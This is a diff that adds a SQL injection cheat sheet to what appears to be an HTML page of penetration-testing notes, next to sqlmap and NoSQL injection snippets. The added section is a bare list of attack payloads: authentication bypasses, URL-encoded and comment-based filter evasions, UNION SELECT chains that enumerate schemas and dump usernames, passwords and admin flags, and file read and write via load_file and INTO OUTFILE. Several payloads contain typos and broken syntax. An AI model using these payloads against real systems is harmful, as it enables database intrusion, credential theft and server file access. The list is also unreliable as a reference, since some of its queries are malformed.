@@ -648,6 +648,54 @@ username[$regex]=^.{4}&amp;password=noexist
 <p>other arguments:</p>
 <pre><code>--os-shell: automatic code execution: os-shel&gt; ipconfig -&gt;succes
 </code></pre>
+<h3 id="top-sql-injections"><a class="header" href="#top-sql-injections">Top SQL Injections:</a></h3>
+<p>1- &gt;&gt; ' OR 1=1 #</p>
+<p>2- &gt;&gt; " OR 1=1 #</p>
+<p>3- &gt;&gt; ' OR 1=1 ' LIMIT 1 #</p>
+<p>4- &gt;&gt; " OR 1=1 ' LIMIT 1 #</p>
+<p>5- &gt;&gt; %27%09OR%091%3D1%23 | (ENCODING to bypass the space filter by replacing it with tabs) | use BurpSuite &gt;&gt;<code>' OR 1=1#</code></p>
+<p>6- &gt;&gt; %27%20%2F%2A%2A%2For%2F%2A%2A%2F1%3D1%23 | (ENCODING to bypass spaces and tabs filter) &gt;&gt;<code>' /**/or/**/1=1#</code></p>
+<p><strong>Basic</strong></p>
+<blockquote>
+<blockquote>
+<p>__' OR 1=1 ;-- - __</p>
+<p>__') OR 1=1; -- - __</p>
+<p><strong>' and 'a '='a</strong></p>
+<p><strong>' and 'a'='b</strong></p>
+</blockquote>
+</blockquote>
+<p><strong>Medium:</strong></p>
+<blockquote>
+<blockquote>
+<p>1' and 1=1 | nbsp; True</p>
+<p>1' and 1=0 | False</p>
+<p>1' order by 1 | True</p>
+<p>1' order by 10000 | False</p>
+<p>1 or db_name()=1); |</p>
+<p>1 or db_name(0)=1) | increase the number until the database does not show any errors</p>
+<p>9999' UNION SELECT name,222,'else1' FROM master.syslogin; --</p>
+</blockquote>
+</blockquote>
+<p><strong>Complex:</strong></p>
+<blockquote>
+<blockquote>
+<p>union select 1, 2, 3 %23 | Bypass Web filters |</p>
+<p>uNioN+sEleCt+1,2+%23 | Bypass Web filters |</p>
+<p>uNioN<code>/**/</code>sEleCt<code>/**/</code>1,2<code>/**/</code>%23 | Bypass Web filters |</p>
+<p>UniOn selEct 1,version() /*</p>
+<p>UniOn selEct 1,database() /*</p>
+<p>UniOn selEct 1,user() /*</p>
+<p>UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*</p>
+<p>UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*</p>
+<p>UniOn selEct 1,[column name] frOm [table name] /*</p>
+<p>UniOn selEct 1,load_file('file location') /* Reading files:</p>
+<p>UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /* Writing files</p>
+<p>union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166 | hex encoding dbname</p>
+<p>' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts' |</p>
+<p>' union select username, pass, is_admin from 'accounts' |</p>
+<p>' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb |</p>
+</blockquote>
+</blockquote>
 
                     </main>
 
